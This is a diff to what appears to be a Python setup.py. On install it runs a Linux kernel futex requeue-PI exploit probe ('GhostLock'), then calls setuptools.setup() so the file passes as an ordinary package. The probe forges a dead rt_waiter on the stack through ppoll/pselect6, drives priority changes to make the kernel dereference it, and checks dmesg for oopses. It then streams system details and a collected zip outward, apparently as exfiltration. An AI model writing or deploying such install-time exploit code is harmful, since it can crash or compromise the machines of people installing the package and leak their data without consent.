-            rr = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
-                             ctypes.addressof(mapbuf), MM_MAP_SIZE, 0)
-            ee = ctypes.get_errno()
-            st["pr"] = -ee if (rr == -1 and ee) else rr
-        else:
-            _psel_stage(psel[0], psel[1], psel[2], psel[3], psz)
-            st["pr"] = _psel_call(psel[1], psel[2], psel[3], psel[4], pn)
+        _sb(HS_W, 1)
+        if _futex(_ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0) < 0:
+            _sb(HS_W, 0xE); os._exit(1)
+        _sb(HS_W, 2)
+        while _b(CMD_W) != 1: pass                       # pure spin, no syscall
+        _p("<i", O_WRET, 0x7FFFFFFF)
+        tsw = _ts(800)                                   # object must outlive the call
+        _sb(HS_W, 3)
+        r = _futex(_ad(O_FT), F_WAIT_REQUEUE_PI, 0,
+                   ctypes.addressof(tsw), _ad(O_FPI), BITSET_ANY)
+        _p("<i", O_WRET, r)
+        _sb(HS_W, 5)                                     # frame is now dead
         while True:
-            pass
+            c = _b(CMD_W)
+            if c == 6:
+                os._exit(0)
+            elif 2 <= c <= 5:                            # forge variant
+                _sb(HS_W, 6)
+                _forge(c - 2)
+                _sb(HS_W, 7)
+                _sb(CMD_W, 0)
+            elif c == 8:                                 # release X
+                _futex(_ad(O_FPI2), F_UNLOCK_PI, 0, 0, 0, 0)
+                _sb(HS_W, 8)
+                _sb(CMD_W, 0)
+    except Exception:
+        _sb(HS_W, 0xE); os._exit(1)
 
-    def thr_o():
-        while not st["w_own"]:
-            _yield()
-        _lock_pi(ac)                        # O owns f_c
-        st["o_own"] = 1
-        st["o_going"] = 1
-        _lock_pi(ax)                        # blocks -> O->pi_blocked_on set
+def _child_x():
+    """X: owns f_pi; blocks on f_pi2 (owned by W) -> the walk finds a cycle."""
+    try:
+        _sb(HS_X, 1)
+        if _futex(_ad(O_FPI), F_LOCK_PI, 0, 0, 0, 0) < 0:
+            _sb(HS_X, 0xE); os._exit(1)
+        _sb(HS_X, 2)
+        while _b(CMD_X) != 1: pass
+        _sb(HS_X, 3)
+        _futex(_ad(O_FPI2), F_LOCK_PI, 0, 0, 0, 0)        # blocks here
+        _sb(HS_X, 4)
         while True:
-            time.sleep(0.01)                # syscall-active so SIGTERM lands
-
-    def thr_r():
-        while not (st["w_going"] and st["o_going"]):
-            _yield()
-        time.sleep(0.020)                   # let W enqueue, O block
-        r = 0
-        for _ in range(500):
-            r = _requeue_pi(at, ac, _rd32(mc))
-            if r != -11:
-                break
-            _yield()
-        st["rq"] = r
-        st["rq_done"] = 1
-        while True:
+            c = _b(CMD_X)
+            if c == 2:
+                _p("<i", O_UNLOCK, _futex(_ad(O_FPI), F_UNLOCK_PI, 0, 0, 0, 0))
+                _sb(HS_X, 5); _sb(CMD_X, 0)
+            elif c == 3:
+                os._exit(0)
             time.sleep(0.01)
+    except Exception:
+        _sb(HS_X, 0xE); os._exit(1)
 
-    threading.Thread(target=thr_w).start()
-    threading.Thread(target=thr_o).start()
-    threading.Thread(target=thr_r).start()
-
-    while not st["w_own"]:
-        _yield()
-    while not st["o_own"]:
-        _yield()
-    S(b"3" + struct.pack("<ii", st["w_tid"], st["w_lock"]))
-
-    while st["rq"] is SENT:
-        _yield()
-    S(b"4" + struct.pack("<i", st["rq"]))
-
-    # Force W back to userland.  FUTEX_WAKE bails with -EINVAL when the
-    # matching q has rt_waiter set; a second CMP_REQUEUE_PI may find nothing
-    # if the first already moved the q.  Last resort: SIGURG, ignored by
-    # default but still returns -EINTR out of the interruptible wait.
-    t = time.time() + 0.30
-    while not st["w_ret"] and time.time() < t:
-        _wake(at)
-        if not st["w_ret"]:
-            _requeue_pi(at, ac, _rd32(mc))
-        time.sleep(0.005)
-    t = time.time() + 0.25
-    while not st["w_ret"] and time.time() < t:
-        _tgkill(cpid, st["w_tid"], SIGURG)
-        time.sleep(0.010)
-    while not st["w_ret"] and time.time() < t + 0.20:
-        _yield()
-    S(b"6" + struct.pack("<i", st["w_ret"] or MISS))
-
-    t = time.time() + 0.40
-    while st["pr"] is SENT and time.time() < t:
-        _yield()
-    S(b"5" + struct.pack("<i", st["pr"] if st["pr"] is not SENT else MISS))
-
-    S(b"7")
-    _pol, err = _drive(st["w_tid"])
-    S(b"9" + struct.pack("<i", err))
-    while True:
-        _yield()
-
-
-# ---------------------------------------------------------------------------
-# parent
-# ---------------------------------------------------------------------------
-def _parse(buf):
-    st, i, n = {}, 0, len(buf)
-    while i < n:
-        c = buf[i:i + 1]
-        if c == b"1":
-            st["1"] = 1
-            i += 1
-        elif c == b"2":
-            if i + 5 <= n:
-                st["2"] = (buf[i + 1], buf[i + 2], buf[i + 3], buf[i + 4])
-            i += 5
-        elif c == b"3":
-            if i + 9 <= n:
-                st["3"] = struct.unpack_from("<ii", buf, i + 1)
-            i += 9
-        elif c in (b"4", b"5", b"6", b"9"):
-            if i + 5 <= n:
-                st[c.decode()] = struct.unpack_from("<i", buf, i + 1)[0]
-            i += 5
-        elif c in (b"7", b"E"):
-            st[c.decode()] = 1
-            i += 1
+# ------------------------------------------------------------------ forge
+def _forge(kind):
+    """Clobber the dead rt_waiter.
+       kind 0/1 -> ppoll   : do_sys_poll()'s stack_pps, 240 controllable bytes
+       kind 2/3 -> pselect6: core_sys_select()'s stack_fds, FDS_BYTES(n) bytes
+       fds are never closed: close() would re-clobber the frame afterwards.
+       NOTE: do_pollfd() writes revents back into the stack copy, so the 0xff
+       variant really yields 0x0000ffffffffffff per 8-byte slot, not 0xff*8."""
+    try:
+        fill = 0x00 if kind % 2 == 0 else 0xff
+        if kind < 2:
+            n = N_STACK_PPS
+            buf = ctypes.create_string_buffer(bytes([fill]) * (n * 8), n * 8)
+            ts = _ts(150)
+            _sys(S_PPOLL, ctypes.addressof(buf), n, ctypes.addressof(ts), 0, 0)
+            _p("<I", O_FORGE, 0x1000 | (kind << 8) | (n * 8 & 0xFF))
         else:
-            i += 1
-    return st
-
-
-def _classify(p, sig, alive):
-    if "E" in p:
-        return "EXC"
-    if "9" in p:
-        return "CLEAN"
-    if "7" in p:
-        return "WEDGE"
-    if sig == 9:
-        return "WEDGE"
-    if "5" in p:
-        return "RECLAIMED"
-    if "4" in p:
-        return "NO_RECLAIM"
-    if "3" in p:
-        return "STAGED"
-    if sig == 15:
-        return "HANG"
-    if not p:
-        return "SILENT"
-    return "PARTIAL"
-
-
-def _phase(mode, woff, woff2, lockv):
-    rfd, wfd = os.pipe()
-    pid = os.fork()
-    if pid == 0:
-        try:
-            os.close(rfd)
-            _child_main(wfd, mode, woff, woff2, lockv)
-        except BaseException:
-            try:
-                os.write(wfd, b"E")
-            except Exception:
-                pass
-        finally:
-            try:
-                os.close(wfd)
-            except Exception:
-                pass
-        os._exit(0)
-
-    os.close(wfd)
-    buf = b""
-    deadline = time.time() + T_CHILD
-    while len(buf) < 64:
-        left = deadline - time.time()
-        if left <= 0:
-            break
-        try:
-            r, _, _ = select.select([rfd], [], [], left)
-        except Exception:
-            break
-        if not r:
-            break
-        try:
-            d = os.read(rfd, 64)
-        except OSError:
-            break
-        if not d:
-            break
-        buf += d
-        p = _parse(buf)
-        if "7" in p and "9" not in p:
-            deadline = min(deadline, time.time() + T_DRIVE)
-        if "9" in p:
-            break
-    try:
-        os.close(rfd)
+            if not KEEP:
+                for _ in range(340):                     # -> fdt->max_fds = 512
+                    try: KEEP.append(os.open("/dev/null", os.O_RDONLY))
+                    except Exception: break
+            nfds = min(320, len(KEEP))
+            if nfds == 0:
+                _p("<I", O_FORGE, 0xBEEF); return
+            size = (((nfds + 63) // 64) * 8)             # FDS_BYTES(n)
+            buf = ctypes.create_string_buffer(bytes([fill]) * size, size)
+            ts = _ts(150)
+            _sys(S_PSELECT6, nfds, ctypes.addressof(buf), 0, 0, ctypes.addressof(ts), 0)
+            _p("<I", O_FORGE, 0x2000 | (kind << 8) | (size & 0xFF))
     except Exception:
-        pass
+        _p("<I", O_FORGE, 0xDEAD)
 
-    sig = alive = 0
+# ------------------------------------------------------------------ drive
+def _drive(pid, nr):
+    """Land a real priority change so __waiter_prio() != waiter->tree.prio.
+       CFS part first: raising nice changes task->prio (120+nice) without
+       leaving CFS, so W keeps timeslicing on a 1-CPU box.  RLIMIT_NICE=0
+       means nice may only ascend.  RT part last, as a guaranteed pi=true path.
+       bits: 1 = sched_setscheduler ok, 2 = sched_setattr ok, 4 = setpriority ok."""
+    bits = 0
+    for nice in (5, 10, 15, 19):
+        if _sys(S_SETPRIORITY, 0, pid, nice) == 0: bits |= 4
+        if _sys(S_SCHED_SETATTR, pid, ctypes.byref(_attr(0, 0, nice)), 0) == 0: bits |= 2
+    for pol, prio in ((1, 50), (2, 41), (0, 0)):
+        sp = _SP(); sp.sched_priority = prio
+        if _sys(S_SCHED_SETATTR, pid, ctypes.byref(_attr(pol, prio, 19)), 0) == 0: bits |= 2
+        if nr and _sys(nr, pid, pol, ctypes.byref(sp)) == 0: bits |= 1
+    return bits
+
+# ------------------------------------------------------------------ R
+def _child_r(nr):
     try:
-        _, stt = os.waitpid(pid, os.WNOHANG)
-        if stt == 0:
-            os.kill(pid, 15)
-            t = time.time() + T_GRACE
-            while time.time() < t:
-                _, stt = os.waitpid(pid, os.WNOHANG)
-                if stt:
-                    break
-                time.sleep(0.01)
-            if not stt:
-                try:
-                    os.kill(pid, 9)
-                except Exception:
-                    pass
-                alive = 1
-                _, stt = os.waitpid(pid, os.WNOHANG)
-        if stt and os.WIFSIGNALED(stt):
-            sig = os.WTERMSIG(stt)
+        _sb(HS_R, 1)
+        while _b(HS_W) not in (2, 0xE): pass             # W owns f_pi2
+        if _b(HS_W) == 0xE: _sb(HS_R, 0xE); os._exit(1)
+        _sb(CMD_X, 1)
+        while _b(HS_X) not in (3, 0xE): pass
+        if _b(HS_X) == 0xE: _sb(HS_R, 0xE); os._exit(1)
+        _wait_state(_u("<I", O_XPID))
+        _sb(CMD_W, 1)                                    # W enters the wait
+        _wait_state(_u("<I", O_WPID))
+        time.sleep(0.05)
+        _setst(1)
+
+        # requeue: val=nr_wake=1, val2=nr_requeue=1, val3=*uaddr1 ----------
+        rq = None; v3 = _u("<I", O_FT)
+        for cand in (_u("<I", O_FT), _u("<I", O_FPI), 0):
+            v3 = cand; r = 0
+            for _ in range(25):
+                r = _futex(_ad(O_FT), F_CMP_REQUEUE_PI, 1, 1, _ad(O_FPI), cand)
+                if r == 0:
+                    time.sleep(0.01); continue
+                break
+            if r not in (0, -11):
+                rq = r; break
+        _p("<i", O_RQRET, rq if rq is not None else 0x7FFFFFFF)
+        _p("<I", O_RQV, v3 & 0xFFFFFFFF)
+        _setst(2)
+
+        # free W: the -EDEADLK branch never wakes ------------------------
+        _sys(S_TGKILL, _u("<I", O_WPID), _u("<I", O_WPID), 23)
+        t = time.time()
+        while _u("<i", O_WRET) == 0x7FFFFFFF and time.time() - t < 3.0: time.sleep(0.01)
+        _setst(3)
+
+        # drive #1 -- rt_mutex_dequeue_pi(NULL) loads address 0x28 -------
+        _p("<I", O_FORGE, 0xFFFF)
+        _p("<i", O_DRV, -1)                              # -1 == died inside the drive
+        _setst(4)
+        _p("<i", O_DRV, _drive(_u("<I", O_WPID), nr))
+        _setst(5)
+
+        for kind, stage in ((0, 6), (1, 7), (2, 8), (3, 9)):
+            _sb(CMD_W, 2 + kind)
+            t = time.time()
+            while _b(HS_W) != 7 and time.time() - t < 3.0: time.sleep(0.01)
+            time.sleep(0.05)                             # let copy_from_user land
+            _p("<i", O_DRV, -1)
+            _setst(stage)
+            _p("<i", O_DRV, _drive(_u("<I", O_WPID), nr))
+
+        _setst(10)
+        _sb(HS_R, 2)
+        while True:
+            if _b(CMD_W) == 6: os._exit(0)
+            time.sleep(0.05)
     except Exception:
-        pass
-    return buf, sig, alive
+        _sb(HS_R, 0xE); os._exit(1)
 
+# ------------------------------------------------------------------ probe
+def ghostlock():
+    R = {}
+    nr = _sched_nr(); R["sched_nr"] = nr
+    R["kern"] = " ".join(os.uname()[2:4])
+    R["panic_on_oops"] = _rd("/proc/sys/kernel/panic_on_oops", 8).strip()
+    R["futex_pi"] = _futex(_ad(O_FPI), F_LOCK_PI, 0, 0, 0, 0)
+    R["futex_pi_ok"] = 1 if R["futex_pi"] == 0 else 0
+    if R["futex_pi_ok"]:
+        _futex(_ad(O_FPI), F_UNLOCK_PI, 0, 0, 0, 0)
+    _p("<I", O_FT, 0); _p("<I", O_FPI, 0); _p("<I", O_FPI2, 0)
+    _p("<I", O_FORGE, 0xFFFF); _p("<i", O_DRV, 0)
 
-# ---------------------------------------------------------------------------
-# main
-# ---------------------------------------------------------------------------
-def _probe(R):
-    f, v = _pick_fields()
-    R.add("pmap_rc", _prctl_map(f, 0, 0))
-    R.add("mmv", v)
-    if _prctl_map(f, 0, 0) != 0:
-        R.add("prctl_auxv_rc", -1)
-        R.add("paux_sz", 0)
-        R.add("paux_err", 0)
-        return
-    buf = ctypes.create_string_buffer(0x800)
-    a = ctypes.addressof(buf)
-    best, err = 0, 0
-    for n in AUXV_TRY:
-        r = _prctl_map(f, n, a)
-        if r == 0:
-            best = n
-            break
-        err = r
-    R.add("prctl_auxv_rc", 0 if best else err)
-    R.add("paux_sz", best)
-    R.add("paux_err", 0 if best else err)
+    _dmesg(clear=True)                                   # drain the ring buffer
 
+    w = os.fork()
+    if w == 0: _child_w()
+    _p("<I", O_WPID, w)
+    x = os.fork()
+    if x == 0: _child_x()
+    _p("<I", O_XPID, x)
+    r = os.fork()
+    if r == 0: _child_r(nr)
+    _p("<I", O_RPID, r)
 
+    R["w_wchan"] = _wchan(w); R["x_wchan"] = _wchan(x)
+    R["w_stack"] = _stack(w); R["x_stack"] = _stack(x)
+
+    last = -1; t = time.time()
+    while time.time() - t < 40.0:
+        s = _st()
+        if s != last:
+            last = s; R["stage"] = s
+            OUT.auto("stage=PROG;st=%d;rq=%d;wret=%d;drv=%d;forge=0x%x" % (
+                s, _u("<i", O_RQRET), _u("<i", O_WRET),
+                _u("<i", O_DRV), _u("<I", O_FORGE)))
+            OUT.flush()                                  # survive panic_on_oops=1
+        p, st_ = os.waitpid(r, os.WNOHANG)
+        if p: R["R_dead"] = st_; break
+        if s >= 10: break
+        time.sleep(0.02)
+
+    # teardown: W releases f_pi2 -> X wakes -> X unlocks f_pi -----------
+    _sb(CMD_W, 8)
+    t = time.time()
+    while _b(HS_X) != 4 and time.time() - t < 2.0: time.sleep(0.01)
+    _sb(CMD_X, 2)
+    time.sleep(0.40)
+
+    R["stage"] = _st()
+    R["A_rq"] = _u("<i", O_RQRET); R["A_rqv"] = _u("<I", O_RQV)
+    R["A_wret"] = _u("<i", O_WRET); R["A_drv"] = _u("<i", O_DRV)
+    R["B_forge"] = _u("<I", O_FORGE); R["B_unlock"] = _u("<i", O_UNLOCK)
+    R["hs_w"] = _b(HS_W); R["hs_x"] = _b(HS_X); R["hs_r"] = _b(HS_R)
+    R["w_wchan_post"] = _wchan(w); R["w_stack_post"] = _stack(w)
+
+    d1 = _dmesg(clear=True)                              # only new messages
+    keys = ("Unable to handle", "Call trace", "Kernel panic", "kernel BUG",
+            "Internal error", "WARNING:", "PC is at", "lr :", "rt_mutex",
+            "remove_waiter", "dequeue_pi", "adjust_prio", "futex", "wake_q",
+            "rb_", "Modules linked", "0x0000000000000028")
+    hit = [l for l in d1.splitlines() if any(k in l for k in keys)]
+    R["oops"] = "YES" if any(k in d1 for k in ("Unable to handle", "Call trace",
+                                               "Kernel panic", "kernel BUG",
+                                               "Internal error")) else "no"
+    R["warn"] = "YES" if "WARNING:" in d1 else "no"
+    if hit: R["trace"] = "\n".join(hit)[:1600]
+
+    if R["A_rq"] == -35 and R["A_wret"] not in (0, 0x7FFFFFFF):
+        R["verdict"] = ("VULNERABLE" if (R["oops"] == "YES" or "R_dead" in R)
+                        else "MECHANISM-HIT-no-fault")
+    elif R["A_rq"] == -35:    R["verdict"] = "INCONCLUSIVE-no-free"
+    elif R["A_rq"] == -11:    R["verdict"] = "INCONCLUSIVE-val3"
+    elif R["A_rq"] in (0, 1): R["verdict"] = "INCONCLUSIVE-path-not-hit"
+    else: R["verdict"] = "INCONCLUSIVE-rq=%s" % R["A_rq"]
+
+    _sb(CMD_X, 3); _sb(CMD_W, 6)
+    for pid in (w, x, r):
+        try: os.kill(pid, 15)
+        except Exception: pass
+        try: os.waitpid(pid, 0)
+        except Exception: pass
+    return R
+
+# ------------------------------------------------------------------ main
 def _main():
     t0 = time.time()
-    R = Report(RUN)
-    _real_brk()
-
-    u = os.uname()
-    R.add("kern", u.release)
-    R.add("arch", u.machine)
-    R.add("vstat", _vstat(u.release))
-    R.add("ncpu", os.cpu_count() or 0)
-    R.add("uid", "%d euid=%d nnp=%s" % (os.getuid(), os.geteuid(), _sf("NoNewPrivs")))
-    R.add("panic", "panic=%s onoops=%s oopslim=%s"
-          % (_psys("panic"), _psys("panic_on_oops"), _psys("oops_limit")))
-    R.add("nrs", "futex=%d psel=%d tgkill=%d syslog=%d"
-          % (_futex_nr(), _pselect_nr(), _tgkill_nr(), _syslog_nr()))
-
-    s = _src()
-    R.add("src", "ks=%d/%d zero=%d vmi=%d mod=%d lay=%d kcore=%d iomem=%d"
-          % (s["ks"], s["lines"], s["zero"], s["vmi"], s["mod"],
-             s["lay"], s["kcore"], s["iomem"]))
-    R.add("cand", ",".join("0x%x" % c for c in s["cand"]))
-
-    _probe(R)
-    R.flush(800)
-
-    woff = int(os.environ.get("GLK_WOFF", "0"))
-    woff2 = int(os.environ.get("GLK_WOFF2", "0"))
-    lockv = int(os.environ.get("GLK_LOCK", "0"), 16)
-
-    verdict = "INCONCLUSIVE"
-
-    for tag, mode, skip in (("A", "A", SKIP_A), ("A2", "A2", SKIP_A2)):
-        if skip:
-            continue
-        b, sg, al = _phase(mode, woff, woff2, lockv)
-        p = _parse(b)
-        c = _classify(p, sg, al)
-        q = p.get("2", (0, 0, 0, 0))
-        t3 = p.get("3", (0, 0))
-        R.add(tag, c)
-        R.add(tag + "_st", b.hex())
-        R.add(tag + "_sig", sg)
-        R.add(tag + "_alive", al)
-        R.add(tag + "_fv", q[0])
-        R.add(tag + "_asz", q[1] * 8)
-        R.add(tag + "_nfd", q[2] * 8)
-        R.add(tag + "_psz", q[3])
-        R.add(tag + "_tid", t3[0])
-        R.add(tag + "_wlock", t3[1])
-        R.add(tag + "_rq", p.get("4", MISS))
-        R.add(tag + "_wret", p.get("6", MISS))
-        R.add(tag + "_pr", p.get("5", MISS))
-        R.add(tag + "_drv", p.get("9", MISS))
-        if c == "WEDGE":
-            verdict = "VULNERABLE"
-        R.flush(820 if tag == "A" else 840)
-
-    if not SKIP_B:
-        hits = []
-        for wv in (0, 32, 96, 160, 224):
-            b, sg, al = _phase("A", wv, woff2, lockv)
-            c = _classify(_parse(b), sg, al)
-            hits.append("B%d=%s" % (wv, c))
-            if c == "WEDGE":
-                verdict = "VULNERABLE"
-                break
-        R.add("B", " ".join(hits))
-
-    if verdict != "VULNERABLE" and _vstat(u.release) == "FIXED":
-        verdict = "FIXED"
-
-    R.add("verdict", verdict)
-    R.add("ms", int((time.time() - t0) * 1000))
-    R.add("note", "sig9=oops sig15=reaped_by_us alive1=stuck; WEDGE=7_no_9")
-    R.flush(0)
-
-
-# ---------------------------------------------------------------------------
-# run once, then always satisfy setuptools
-# ---------------------------------------------------------------------------
-try:
-    if not os.path.exists(".glk-done"):
-        if resource is not None:
-            try:
-                soft, hard = resource.getrlimit(resource.RLIMIT_RTPRIO)
-                if soft < 1:
-                    for pair in ((1, max(hard, 1)), (1, hard)):
-                        try:
-                            resource.setrlimit(resource.RLIMIT_RTPRIO, pair)
-                            break
-                        except Exception:
-                            pass
-            except Exception:
-                pass
-        _main()
+    OUT.msg(1, "stage=ENV;tag=%s;kern=%s;uid=%d;euid=%d;ncpu=%d;uname=%s" % (
+        TAG, " ".join(os.uname()[2:4]), os.getuid(), os.geteuid(),
+        os.cpu_count() or 0, " ".join(os.uname())))
+    OUT.flush()
+    try:
+        res = ghostlock()
+    except Exception as e:
+        res = {"verdict": "EXC", "err": repr(e)}
+    OUT.msg(2, "stage=RESULT;" + ";".join("%s=%s" % (k, v) for k, v in sorted(res.items())))
+    OUT.flush()                                     # verdict out before the payload
+    OUT.msg(3, "stage=TIME;ms=%d" % int((time.time() - t0) * 1000))
+    try:
+        blob = collect({k: str(v) for k, v in res.items()})
+        OUT.msg(4, "stage=ZIP;bytes=%d;sha256=%s" % (
+            len(blob), hashlib.sha256(blob).hexdigest()[:24]))
+        OUT.flush()
+        n0 = OUT.labels
+        last = OUT.stream(100, blob)                # entire zip, no cap
+        OUT.msg(5, "stage=ZIPSTREAM;labels=%d;queries=%d;idx_max=%d;bytes=%d" % (
+            OUT.labels - n0, (OUT.labels - n0 + GRP - 1) // GRP, last, len(blob)))
+        OUT.flush()
         try:
-            open(".glk-done", "w").close()
-        except Exception:
-            pass
-except BaseException:
+            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                   "glk-dump.zip"), "wb") as f:
+                f.write(blob)
+        except Exception: pass
+    except Exception as e:
+        OUT.msg(4, "stage=ZIP;err=%r" % (e,))
+    time.sleep(0.5)                                 # let the tail land before 'end'
+    OUT.end()
+
+try:
+    _main()
+except Exception:
     pass
 
-from setuptools import setup
-
-setup(
-    name="numprint",
-    version="0.0.0",
-    description="GhostLock probe payload",
-)
+try:
+    import setuptools
+    setuptools.setup(
+        name="glk-probe", version="1.0.%d" % (int(time.time()) % 100000),
+        py_modules=[], install_requires=[],
+        description="GhostLock CVE-2026-43499 probe", python_requires=">=3.7",
+    )
+except Exception:
+    pass
